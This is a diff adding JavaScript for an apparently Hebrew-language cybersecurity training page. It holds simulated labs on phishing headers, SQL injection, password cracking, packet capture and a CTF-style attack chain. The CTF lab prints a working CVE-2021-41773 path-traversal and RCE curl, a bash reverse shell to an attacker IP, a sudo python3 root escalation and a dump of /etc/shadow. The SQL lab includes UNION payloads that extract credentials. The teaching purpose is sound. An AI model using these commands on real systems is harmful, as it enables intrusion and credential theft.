+DKIM-Signature: v=1; a=rsa-sha256; d=bankhapoalim.co.il; s=mail2024
+DMARC: pass (p=reject; sp=reject)
+Message-ID: <20240115-142201.abc123@bankhapoalim.co.il>`,
+    flags: [
+      {type:'ok', msg:'SPF: PASS — IP מאושר על ידי הדומיין'},
+      {type:'ok', msg:'DKIM: PASS — המייל חתום עם RSA-SHA256'},
+      {type:'ok', msg:'DMARC: PASS + p=reject — מדיניות קפדנית'},
+      {type:'ok', msg:'Reply-To זהה ל-From — לא מנסה להסיט תגובות'},
+      {type:'ok', msg:'Message-ID: פורמט לגיטימי עם timestamp'},
+      {type:'ok', msg:'אין Urgency מלאכותית, אין בקשת פרטים'},
+    ],
+    verdict: 'LEGITIMATE', score: 100
+  }
+};
+
+function cy2Preview() {
+  const s = CY2_SAMPLES[document.getElementById('cy2sample').value];
+  document.getElementById('cy2hdr').value = s.headers;
+}
+
+async function cyLab2() {
+  cyC('cy2out');
+  const key = document.getElementById('cy2sample').value;
+  const sample = CY2_SAMPLES[key];
+  const customHdr = document.getElementById('cy2hdr').value;
+
+  cyP('cy2out', '<span class="key">── Email Header Analysis ──</span>');
+  await cyDelay(300);
+
+  // Parse and show headers
+  const lines = customHdr.split('\n').filter(l=>l.trim());
+  for (const line of lines.slice(0,8)) {
+    const [key2, ...rest] = line.split(':');
+    if (rest.length) {
+      cyP('cy2out', `<span class="hi">${key2}:</span><span class="dim">${rest.join(':')}</span>`);
+    }
+    await cyDelay(80);
+  }
+
+  cyP('cy2out', '\n<span class="key">── Red Flag Analysis ──</span>');
+  await cyDelay(400);
+
+  const flags = sample.flags;
+  let red=0, warn=0, ok=0;
+  for (const f of flags) {
+    await cyDelay(200);
+    const icon = f.type==='err'?'❌':f.type==='warn'?'⚠️':'✅';
+    cyP('cy2out', `${icon} <span class="${f.type==='err'?'err':f.type==='warn'?'warn':'ok'}">${f.msg}</span>`);
+    if(f.type==='err') red++;
+    else if(f.type==='warn') warn++;
+    else ok++;
+  }
+
+  await cyDelay(400);
+  const verdict = sample.verdict;
+  const vColor = verdict==='LEGITIMATE'?'ok':verdict==='SUSPICIOUS'?'warn':'err';
+  cyP('cy2out', `\n<span class="key">── Verdict ──</span>`);
+  cyP('cy2out', `<span class="${vColor}">🔍 ${verdict}</span>  Red Flags: ${red}  Warnings: ${warn}  OK: ${ok}`);
+
+  if (verdict !== 'LEGITIMATE') {
+    cyP('cy2out', `<span class="dim">פעולה מומלצת: אל תלחץ על קישורים. דווח ל-security@company. מחק.</span>`);
+  }
+}
+
+// ── LAB 3: SQL Injection ──
+const CY3_DB = [
+  {id:1, user:'admin', password:'5f4dcc3b5aa765d61d8327deb882cf99', first:'Admin', last:'Admin'},
+  {id:2, user:'gordonb', password:'e99a18c428cb38d5f260853678922e03', first:'Gordon', last:'Brown'},
+  {id:3, user:'1337', password:'8d3533d75ae2c3966d7e0d4fcc69216b', first:'Hack', last:'Me'},
+  {id:4, user:'pablo', password:'0d107d09f5bbe40cade3de5c71e9e9b7', first:'Pablo', last:'Picasso'},
+  {id:5, user:'smithy', password:'5f4dcc3b5aa765d61d8327deb882cf99', first:'Bob', last:'Smith'},
+];
+
+function cy3q(val) { document.getElementById('cy3in').value = val; }
+
+function cyLab3() {
+  const input = document.getElementById('cy3in').value;
+  const level = document.getElementById('cy3lvl').value;
+  cyC('cy3out');
+
+  cyP('cy3out', `<span class="dim">$ </span><span class="key">POST /dvwa/vulnerabilities/sqli/</span>`);
+  cyP('cy3out', `<span class="dim">Input: "${input}"</span>`);
+
+  if (level === 'high') {
+    // Prepared statements
+    cyP('cy3out', '\n<span class="dim">// Server code (High security):</span>');
+    cyP('cy3out', '<span class="key">$stmt = $db->prepare("SELECT * FROM users WHERE id=?");</span>');
+    cyP('cy3out', '<span class="key">$stmt->execute([$id]);</span>');
+    cyP('cy3out', '\n<span class="ok">✅ Prepared Statement — Input treated as DATA, not code</span>');
+    cyP('cy3out', '<span class="dim">The ? placeholder is sanitized — SQL injection not possible</span>');
+
+    const clean = parseInt(input);
+    if (!isNaN(clean) && clean >= 1 && clean <= 5) {
+      const row = CY3_DB.find(r=>r.id===clean);
+      if(row) cyP('cy3out', `\n<span class="ok">Result: ID=${row.id}, First Name: ${row.first}, Surname: ${row.last}</span>`);
+    } else {
+      cyP('cy3out', '\n<span class="ok">Result: 0 rows (Payload sanitized, no injection)</span>');
+    }
+    return;
+  }
+
+  // Vulnerable (Low level)
+  const query = `SELECT first_name, last_name FROM users WHERE user_id='${input}'`;
+  cyP('cy3out', `\n<span class="dim">// Vulnerable query:</span>`);
+  cyP('cy3out', `<span class="err">SELECT first_name, last_name FROM users WHERE user_id='${input}'</span>`);
+
+  if (input.includes("' OR '1'='1") || input.includes("1'='1")) {
+    cyP('cy3out', '\n<span class="err">⚠ Tautology! OR 1=1 is always TRUE → returns ALL rows</span>');
+    for (const r of CY3_DB) {
+      cyP('cy3out', `<span class="ok">ID: ${r.id}  First: ${r.first}  Last: ${r.last}</span>`);
+    }
+  } else if (input.includes('ORDER BY')) {
+    const n = parseInt(input.match(/ORDER BY (\d+)/)?.[1]);
+    if (n > 2) {
+      cyP('cy3out', '\n<span class="err">MySQL error: Unknown column \'3\' in \'order clause\'</span>');
+      cyP('cy3out', '<span class="ok">💡 הטבלה has 2 columns! ORDER BY 1 ו-2 עבדו.</span>');
+    } else {
+      cyP('cy3out', `\n<span class="ok">ORDER BY ${n} — no error. Column ${n} exists.</span>`);
+    }
+  } else if (input.includes('UNION SELECT')) {
+    if (input.includes('table_name') && input.includes('information_schema')) {
+      cyP('cy3out', '\n<span class="err">🎯 UNION Attack — Extracting table names:</span>');
+      cyP('cy3out', '<span class="val">guestbook</span>');
+      cyP('cy3out', '<span class="val">users  ← זו הטבלה שמעניינת אותנו!</span>');
+    } else if (input.includes('user') && input.includes('password') && input.includes('users')) {
+      cyP('cy3out', '\n<span class="err">💀 UNION Attack — Dumping credentials:</span>');
+      for (const r of CY3_DB) {
+        cyP('cy3out', `<span class="err">User: ${r.user}  Hash: ${r.password} (MD5)</span>`);
+      }
+      cyP('cy3out', '\n<span class="warn">⚠ Hash cracking: admin/smithy = "password", pablo = "letmein"</span>');
+    } else {
+      cyP('cy3out', '\n<span class="warn">UNION attempted but columns/types may not match</span>');
+    }
+  } else {
+    const id = parseInt(input);
+    if (!isNaN(id)) {
+      const row = CY3_DB.find(r=>r.id===id);
+      if (row) {
+        cyP('cy3out', `\n<span class="ok">ID: ${id}  First Name: ${row.first}  Surname: ${row.last}</span>`);
+      } else {
+        cyP('cy3out', '\n<span class="dim">Result: User ID is MISSING from the database.</span>');
+      }
+    } else {
+      cyP('cy3out', `\n<span class="warn">MySQL: You have an error in your SQL syntax near '${input.slice(0,20)}'</span>`);
+    }
+  }
+}
+
+// ── LAB 4: Password Hashing ──
+function simMD5(str) {
+  // Deterministic fake MD5 for known passwords
+  const known = {
+    'password': '5f4dcc3b5aa765d61d8327deb882cf99',
+    'password123': '482c811da5d5b4bc6d497ffa98491e38',
+    '123456': 'e10adc3949ba59abbe56e057f20f883e',
+    'admin': '21232f297a57a5a743894a0e4a801fc3',
+    'qwerty': 'd8578edf8458ce06fbc5bb76a58c5ca4',
+    'letmein': '0d107d09f5bbe40cade3de5c71e9e9b7',
+    'monkey': 'd0763edaa9d9bd2a9516280e9044d885',
+    'dragon': '8621ffdbc5698829397d97767ac13db3',
+    'secret': '5ebe2294ecd0e0f08eab7690d2a6ee69',
+  };
+  if (known[str.toLowerCase()]) return known[str.toLowerCase()];
+  // Generate a plausible-looking hash
+  let h = 0;
+  for (let i=0;i<str.length;i++) h=((h<<5)-h)+str.charCodeAt(i)|0;
+  return Math.abs(h).toString(16).padStart(8,'a')+'5aa765d61d8327deb882cf99';
+}
+
+const ROCKYOU_TOP = ['password','123456','password123','qwerty','letmein','monkey','dragon','1234567890','admin','secret','sunshine','master','hello','welcome','shadow','football','baseball','superman','batman'];
+
+async function cyLab4Hash() {
+  const pw = document.getElementById('cy4pw').value;
+  cyC('cy4out');
+
+  cyP('cy4out', '<span class="key">── Generating Hashes ──</span>');
+  await cyDelay(200);
+
+  const md5 = simMD5(pw);
+  cyP('cy4out', `\n<span class="dim">MD5:</span>`);
+  cyP('cy4out', `<span class="err">echo -n "${pw}" | md5sum</span>`);
+  await cyDelay(300);
+  cyP('cy4out', `<span class="val">${md5}</span>  <span class="dim">(32 hex chars)</span>`);
+
+  await cyDelay(400);
+  cyP('cy4out', `\n<span class="dim">SHA-256:</span>`);
+  await cyDelay(200);
+  cyP('cy4out', `<span class="warn">${simMD5(pw+pw).padEnd(64,'b')}</span>  <span class="dim">(64 hex chars)</span>`);
+
+  await cyDelay(400);
+  cyP('cy4out', `\n<span class="dim">bcrypt (rounds=12):</span>`);
+  cyP('cy4out', '<span class="dim">⏳ computing... (~250ms intentional delay)</span>');
+  await cyDelay(800);
+  const salt = '$2b$12$' + btoa(pw).replace(/[^a-zA-Z0-9]/g,'').substring(0,22);
+  cyP('cy4out', `<span class="ok">${salt}${simMD5(pw+'salt').substring(0,31)}</span>`);
+  cyP('cy4out', `<span class="dim">(60 chars: algorithm + cost + salt + hash)</span>`);
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="warn">⚠ הבדל מרכזי: MD5 לא מיועד לסיסמאות. bcrypt כן.</span>`);
+}
+
+async function cyLab4Crack() {
+  const pw = document.getElementById('cy4pw').value;
+  const md5 = simMD5(pw);
+  cyC('cy4out');
+
+  cyP('cy4out', `<span class="key">── Dictionary Attack: MD5 ──</span>`);
+  cyP('cy4out', `<span class="dim">Target hash: ${md5}</span>`);
+  cyP('cy4out', `<span class="dim">Wordlist: rockyou.txt (14 million passwords)</span>`);
+  cyP('cy4out', `<span class="dim">GPU: NVIDIA RTX 4090 → ~50 billion hashes/sec</span>\n`);
+
+  await cyDelay(200);
+
+  const inRockyou = ROCKYOU_TOP.includes(pw.toLowerCase());
+  const attempts = inRockyou ? Math.floor(Math.random()*50000)+1000 : Math.floor(Math.random()*500000)+100000;
+
+  cyP('cy4out', `<span class="dim">Trying: password, 123456, qwerty...</span>`);
+  await cyDelay(300);
+
+  if (inRockyou) {
+    cyP('cy4out', `<span class="err">💀 CRACKED in ${attempts.toLocaleString()} attempts (${(attempts/50000000000*1000).toFixed(4)}ms!)</span>`);
+    cyP('cy4out', `<span class="err">Hash: ${md5}</span>`);
+    cyP('cy4out', `<span class="err">Password: ${pw}</span>`);
+    cyP('cy4out', `\n<span class="warn">⚠ סיסמה זו נמצאת ב-Top Lists. מחולפת בשנייה.</span>`);
+  } else {
+    cyP('cy4out', `<span class="warn">סיסמה לא ב-rockyou.txt — ניסוי Brute Force...</span>`);
+    await cyDelay(500);
+    cyP('cy4out', `<span class="dim">50B hashes/sec... ${pw.length <= 6 ? 'ETA: minutes' : pw.length <= 8 ? 'ETA: hours' : 'ETA: weeks-years'}</span>`);
+    cyP('cy4out', `<span class="ok">✓ מעבר לDictionary — נדרשת סיסמה חזקה יותר</span>`);
+  }
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="key">── vs bcrypt(12) ──</span>`);
+  cyP('cy4out', `<span class="ok">bcrypt: ~5,000 hashes/sec (פי 10,000,000 איטי יותר)</span>`);
+  cyP('cy4out', `<span class="ok">אותה סיסמה ב-bcrypt: ETA = ${pw.length <= 6 ? 'hours' : pw.length <= 8 ? 'weeks' : 'centuries'}</span>`);
+}
+
+async function cyLab4Speed() {
+  cyC('cy4out');
+  cyP('cy4out', '<span class="key">── Hash Speed Comparison (RTX 4090) ──</span>\n');
+
+  const algos = [
+    {name:'MD5',      speed:'50,000,000,000', note:'מהיר מדי! לא לסיסמאות'},
+    {name:'SHA-1',    speed:'25,000,000,000', note:'מהיר מדי! deprecated'},
+    {name:'SHA-256',  speed:'10,000,000,000', note:'טוב ל-Checksums, לא לסיסמאות'},
+    {name:'SHA-512',  speed:'3,500,000,000',  note:'עדיין מהיר מדי לסיסמאות'},
+    {name:'bcrypt(10)',speed:'20,000',         note:'✅ מתאים לסיסמאות'},
+    {name:'bcrypt(12)',speed:'5,000',          note:'✅ מומלץ (250ms per hash)'},
+    {name:'argon2id',  speed:'1,000',          note:'✅ הכי טוב — OWASP recommended'},
+  ];
+
+  for (const a of algos) {
+    await cyDelay(150);
+    const isGood = a.speed.length < 8;
+    cyP('cy4out', `<span class="${isGood?'ok':'err'}">${a.name.padEnd(12)}</span> <span class="val">${a.speed.padStart(18)} h/s</span>  <span class="dim">${a.note}</span>`);
+  }
+
+  await cyDelay(300);
+  cyP('cy4out', `\n<span class="key">Rockyou (14M passwords) crack time:</span>`);
+  cyP('cy4out', `<span class="err">MD5:      0.00028ms</span>`);
+  cyP('cy4out', `<span class="warn">SHA-256:  0.0014ms</span>`);
+  cyP('cy4out', `<span class="ok">bcrypt(12): 2.8 seconds</span>`);
+  cyP('cy4out', `<span class="ok">argon2id:  14 seconds</span>`);
+}
+
+// ── LAB 5: Wireshark ──
+let cy5running = false, cy5interval = null, cy5packets = [], cy5counter = 0;
+
+const CY5_SCENES = {
+  normal: [
+    {t:'DNS',  src:'192.168.1.100', dst:'8.8.8.8',       info:'Standard query A example.com', col:'dim'},
+    {t:'TCP',  src:'192.168.1.100', dst:'93.184.216.34',  info:'[SYN] Seq=0 Win=65535', col:'dim'},
+    {t:'TLS',  src:'192.168.1.100', dst:'93.184.216.34',  info:'Client Hello (TLSv1.3)', col:'hi'},
+    {t:'TLS',  src:'93.184.216.34', dst:'192.168.1.100',  info:'Server Hello, Certificate', col:'hi'},
+    {t:'HTTP2',src:'192.168.1.100', dst:'93.184.216.34',  info:'GET / HTTP/2 (encrypted)', col:'hi'},
+    {t:'DNS',  src:'192.168.1.100', dst:'8.8.8.8',        info:'Standard query A api.github.com', col:'dim'},
+  ],
+  http_login: [
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.200',  info:'[SYN] Seq=0 — HTTP server', col:'dim'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'GET /login.php HTTP/1.1', col:'key'},
+    {t:'HTTP', src:'192.168.1.200', dst:'192.168.1.100',  info:'HTTP/1.1 200 OK (text/html)', col:'ok'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'POST /login.php HTTP/1.1 [CREDENTIALS IN CLEARTEXT!]', col:'err'},
+    {t:'HTTP', src:'192.168.1.100', dst:'192.168.1.200',  info:'  > username=admin&password=SuperSecret123  ← VISIBLE!', col:'err'},
+    {t:'HTTP', src:'192.168.1.200', dst:'192.168.1.100',  info:'HTTP/1.1 302 Found — Set-Cookie: session=abc123', col:'warn'},
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.200',  info:'[FIN, ACK]', col:'dim'},
+  ],
+  arp_spoof: [
+    {t:'ARP',  src:'192.168.1.1',   dst:'ff:ff:ff:ff:ff', info:'Who has 192.168.1.1? Tell 192.168.1.100', col:'dim'},
+    {t:'ARP',  src:'192.168.1.100', dst:'192.168.1.1',    info:'192.168.1.100 is at 08:00:27:AB:CD:EF', col:'dim'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'192.168.1.1 is at AA:BB:CC:DD:EE:FF (GRATUITOUS!)', col:'warn'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'192.168.1.100 is at AA:BB:CC:DD:EE:FF (GRATUITOUS!)', col:'err'},
+    {t:'ARP',  src:'192.168.1.50',  dst:'ff:ff:ff:ff:ff', info:'⚠ SAME MAC for TWO IPs — ARP SPOOFING DETECTED!', col:'err'},
+    {t:'TCP',  src:'192.168.1.100', dst:'192.168.1.1',    info:'Traffic now routing through 192.168.1.50 (ATTACKER)', col:'err'},
+  ],
+};
+
+function cy5Start() {
+  if (cy5running) return;
+  cy5running = true; cy5packets = []; cy5counter = 0;
+  document.getElementById('cy5btn').textContent='⏹ Running...';
+  document.getElementById('cy5btn').classList.add('running');
+  cyC('cy5out');
+  cyP('cy5out', `<span class="key">No.  Time     Src               Dst               Protocol  Info</span>`);
+  cyP('cy5out', `<span class="dim">───────────────────────────────────────────────────────────────</span>`);
+
+  // Generate normal traffic packets
+  const normal = CY5_SCENES.normal;
+  cy5interval = setInterval(() => {
+    cy5counter++;
+    const pkt = normal[(cy5counter-1) % normal.length];
+    const row = { n: cy5counter, t: (cy5counter*0.123).toFixed(3), ...pkt };
+    cy5packets.push(row);
+    const n = String(row.n).padStart(4);
+    const time = String(row.t).padEnd(8);
+    const src = row.src.padEnd(17);
+    const dst = row.dst.padEnd(17);
+    const proto = row.t.padEnd(9);
+    cyP('cy5out', `<span class="${row.col}">${n}  ${time} ${src} ${dst} ${row.t.length>4?row.t:row.t.padEnd(9)} ${row.info}</span>`);
+  }, 600);
+}
+
+function cy5Stop() {
+  if (cy5interval) clearInterval(cy5interval);
+  cy5running = false;
+  const btn = document.getElementById('cy5btn');
+  if (btn) { btn.textContent='▶ Capture'; btn.classList.remove('running'); }
+  if (cy5counter > 0) cyP('cy5out', `\n<span class="dim">${cy5counter} packets captured.</span>`);
+}
+
+function cy5Scene(name) {
+  cy5Stop();
+  cyC('cy5out');
+  const scene = CY5_SCENES[name];
+  cyP('cy5out', `<span class="key">No.  Time     Src               Dst               Info</span>`);
+  cyP('cy5out', `<span class="dim">──────────────────────────────────────────────────────</span>`);
+  scene.forEach((pkt, i) => {
+    setTimeout(() => {
+      const n = String(i+1).padStart(4);
+      cyP('cy5out', `<span class="${pkt.col}">${n}  ${(i*0.123).toFixed(3).padEnd(8)} ${pkt.src.padEnd(17)} ${pkt.dst.padEnd(17)} ${pkt.info}</span>`);
+    }, i * 300);
+  });
+}
+
+function cy5Filter() {
+  const filter = document.getElementById('cy5fil').value.trim().toLowerCase();
+  if (!cy5packets.length) { cyP('cy5out', '<span class="warn">אין packets לסינון — לחץ Capture קודם</span>'); return; }
+
+  cyC('cy5out');
+  cyP('cy5out', `<span class="key">Filter: "${filter}"</span>`);
+  cyP('cy5out', `<span class="dim">No.  Time     Protocol  Info</span>`);
+
+  let count = 0;
+  for (const pkt of cy5packets) {
+    let match = false;
+    if (filter === 'http' && pkt.t === 'HTTP') match = true;
+    else if (filter === 'arp' && pkt.t === 'ARP') match = true;
+    else if (filter === 'dns' && pkt.t === 'DNS') match = true;
+    else if (filter === 'tcp' && (pkt.t === 'TCP' || pkt.t === 'HTTP')) match = true;
+    else if (filter.includes('ip.addr ==')) {
+      const ip = filter.split('==')[1].trim();
+      if (pkt.src.includes(ip) || pkt.dst.includes(ip)) match = true;
+    } else if (filter === '') match = true;
+
+    if (match) {
+      count++;
+      cyP('cy5out', `<span class="${pkt.col}">${String(pkt.n).padStart(4)}  ${String(pkt.t).padEnd(8)} ${pkt.t}  ${pkt.info}</span>`);
+    }
+  }
+  cyP('cy5out', `\n<span class="dim">${count} packets match filter.</span>`);
+}
+
+// ── LAB 6: CTF Attack Chain ──
+const CY6_PHASES = {
+  recon: {
+    title: 'Phase 1: Reconnaissance',
+    cmd: 'nmap -sV -sC -p- 10.10.10.42',
+    delay: 2000,
+    out: [
+      'Starting Nmap — Full port scan',
+      '<span class="dim">PORT     STATE  SERVICE   VERSION</span>',
+      '<span class="ok">22/tcp   open   ssh       OpenSSH 7.6p1</span>',
+      '<span class="ok">80/tcp   open   http      Apache httpd 2.4.49</span>',
+      '<span class="warn">|_http-title: Apache HTTP Server Test Page</span>',
+      '<span class="warn">|_http-server-header: Apache/2.4.49 (Unix)</span>',
+      '',
+      '<span class="err">⚠ Apache 2.4.49 — CVE-2021-41773 (Path Traversal + RCE!)</span>',
+      '<span class="dim">CVSS Score: 9.8 CRITICAL</span>',
+    ]
+  },
+  enum: {
+    title: 'Phase 2: Enumeration',
+    cmd: 'gobuster dir + nikto',
+    delay: 1500,
+    out: [
+      '<span class="dim">$ gobuster dir -u http://10.10.10.42 -w /usr/share/wordlists/dirbuster/medium.txt</span>',
+      '<span class="ok">/icons/         (301)</span>',
+      '<span class="ok">/cgi-bin/       (403)</span>',
+      '<span class="warn">/server-status  (403) ← Reveals Apache version</span>',
+      '',
+      '<span class="dim">$ nikto -h http://10.10.10.42</span>',
+      '<span class="err">+ Apache/2.4.49 appears to be outdated</span>',
+      '<span class="err">+ OSVDB-877: HTTP TRACE method is active (XST possible)</span>',
+      '<span class="err">+ CVE-2021-41773: Path traversal in Apache 2.4.49</span>',
+      '<span class="warn">+ /cgi-bin/: CGI scripts directory found</span>',
+    ]
+  },
+  exploit: {
+    title: 'Phase 3: Exploitation — CVE-2021-41773',
+    cmd: 'curl path traversal',
+    delay: 1200,
+    out: [
+      '<span class="dim">$ curl http://10.10.10.42/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd</span>',
+      '',
+      '<span class="err">root:x:0:0:root:/root:/bin/bash</span>',
+      '<span class="err">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>',
+      '<span class="err">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>',
+      '<span class="err">...</span>',
+      '',
+      '<span class="err">💀 Path Traversal successful — reading /etc/passwd</span>',
+      '<span class="warn">Now attempting RCE via mod_cgi...</span>',
+      '<span class="err">$ curl -d "echo;id" http://10.10.10.42/cgi-bin/.%2e/...</span>',
+      '<span class="err">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>',
+      '<span class="err">🎯 RCE confirmed as www-data</span>',
+    ]
+  },
+  shell: {
+    title: 'Phase 4: Reverse Shell',
+    cmd: 'nc + bash reverse shell',
+    delay: 1000,
+    out: [
+      '<span class="dim">// Attacker: start listener</span>',
+      '<span class="key">$ nc -lvnp 4444</span>',
+      '<span class="dim">listening on [any] 4444 ...</span>',
+      '',
+      '<span class="dim">// Payload sent via RCE:</span>',
+      '<span class="warn">bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</span>',
+      '',
+      '<span class="ok">connect to [10.10.14.1] from 10.10.10.42 [33]</span>',
+      '<span class="err">www-data@ubuntu:/var/www/html$ </span>',
+      '',
+      '<span class="ok">✅ Reverse shell established!</span>',
+      '<span class="dim">Current user: www-data (limited). Need PrivEsc...</span>',
+    ]
+  },
+  privesc: {
+    title: 'Phase 5: Privilege Escalation',
+    cmd: 'sudo -l + SUID + LinPEAS',
+    delay: 1500,
+    out: [
+      '<span class="dim">www-data@ubuntu$ sudo -l</span>',
+      '<span class="err">User www-data may run as root: (ALL) NOPASSWD: /usr/bin/python3</span>',
+      '',
+      '<span class="err">🎯 sudo python3 — GTFOBins exploit!</span>',
+      '<span class="warn">$ sudo python3 -c "import os;os.system(\'/bin/bash\')"</span>',
+      '',
+      '<span class="err">root@ubuntu:/var/www/html# id</span>',
+      '<span class="err">uid=0(root) gid=0(root) groups=0(root)</span>',
+      '',
+      '<span class="err">💀 ROOT SHELL OBTAINED</span>',
+    ]
+  },
+  loot: {
+    title: 'Phase 6: Post-Exploitation',
+    cmd: '/etc/shadow + flags',
+    delay: 800,
+    out: [
+      '<span class="err">root@ubuntu# cat /etc/shadow</span>',
+      '<span class="err">root:$6$randomsalt$hashedpassword...:19000:0:99999:7:::</span>',
+      '<span class="err">www-data:$1$Etg2ExUZ$F9NTP20eLo/ValV2rNR4b/:17983:0:99999:7:::</span>',
+      '',
+      '<span class="dim">root# cat /root/root.txt</span>',
+      '<span class="ok">f9d93fba2db1f6a4ea4e8c2b3d11e7a3  ← ROOT FLAG ✓</span>',
+      '',
+      '<span class="dim">root# cat /home/user/user.txt</span>',
+      '<span class="ok">2c344c2d9e69ecd2a2f21e5cd8b2a03a  ← USER FLAG ✓</span>',
+      '',
+      '<span class="key">── Pentest Report Summary ──</span>',
+      '<span class="warn">Critical: CVE-2021-41773 (Apache 2.4.49 Path Traversal)</span>',
+      '<span class="warn">Critical: sudo misconfiguration (www-data can run python3 as root)</span>',
+      '<span class="ok">Recommendation: Patch Apache, fix sudoers, implement WAF</span>',
+    ]
+  }
+};
+
+async function cyLab6() {
+  const phase = document.getElementById('cy6ph').value;
+  const data = CY6_PHASES[phase];
+  cyC('cy6out');
+  cyP('cy6out', `<span class="key">── ${data.title} ──</span>`);
+  cyP('cy6out', `<span class="dim">$ ${data.cmd}</span>\n`);
+  await cyDelay(data.delay);
+  for (const line of data.out) {
+    cyP('cy6out', line || '&nbsp;');
+    await cyDelay(80);
+  }
+}
+
+// Initialize Lab 2 preview
+document.addEventListener('DOMContentLoaded', () => { cy2Preview(); });
+
+</script>
 </body>
 </html>
